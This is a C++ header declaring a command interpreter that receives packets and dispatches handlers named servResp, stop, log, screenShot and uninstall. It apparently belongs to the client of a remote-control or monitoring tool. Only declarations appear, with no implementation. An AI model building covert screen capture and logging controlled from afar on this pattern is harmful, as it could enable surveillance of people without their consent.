#ifndef INTERPRETER_HPP
# define INTERPRETER_HPP

#include <unordered_map>
#include "Packet.hpp"

class Client;

typedef std::function<void()> cmdFunction;

class Interpreter {
public:
	Interpreter();
	~Interpreter() {}

	void hookClient(Client *client) { _client = client; }
	void handleCommand(Packet &packet);

private:
	void servResp();
	void stop();
	void log();
	void screenShot();
	void uninstall();

private:
	Client *_client;
	std::unordered_map<Packet::PacketType, cmdFunction> _commandMap;
	std::string response;
};

#endif